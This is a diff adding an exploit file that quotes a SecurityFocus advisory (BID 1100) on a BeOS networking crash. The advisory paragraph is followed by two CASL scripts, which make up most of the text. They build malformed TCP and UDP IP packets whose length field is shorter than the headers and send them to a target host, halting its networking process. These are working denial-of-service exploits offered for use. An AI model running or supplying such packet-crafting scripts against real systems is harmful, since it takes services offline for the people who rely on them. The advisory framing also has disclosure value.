@@ -1,0 +1,45 @@
+source: http://www.securityfocus.com/bid/1100/info
+
+The networking process in BeOS can crash if certain malformed packets are transmitted to it. If the length field is set to a number less than the total length of the IP and protocol (TCP or UDP) headers alone, the process will halt and require manual restarting to regain normal functionality. For TCP, the combined TCP and IP header length is 40, and for UDP the combined UDP and IP header length is 28. 
+
+--------------becasl.casl--------------------
+
+#!/usr/local/casl/bin/casl
+
+    #include "tcpip.casl"
+    #include "packets.casl"
+    #include "tcp.casl"
+
+    srchost = 10.0.0.1;
+    dsthost = 10.0.0.2;
+
+    IPH = copy TCPIP;
+    
+    IPH.ip_hl = 5;
+    IPH.ip_src = srchost;
+    IPH.ip_dst = dsthost;
+    IPH.ip_length = 39;
+    
+    packet = [ IPH ];
+    ip_output(packet);
+
+--------------becasl1.casl--------------------
+
+ #!/usr/local/casl/bin/casl
+
+    #include "tcpip.casl"
+    #include "packets.casl"
+    #include "tcp.casl"
+
+    srchost = 10.0.0.1;
+    dsthost = 10.0.0.2;
+
+    IPH = copy UDPIP;
+
+    IPH.ip_hl = 5;
+    IPH.ip_src = srchost;
+    IPH.ip_dst = dsthost;
+    IPH.ip_length = 27;
+
+    packet = [ IPH ];
+    ip_output(packet);
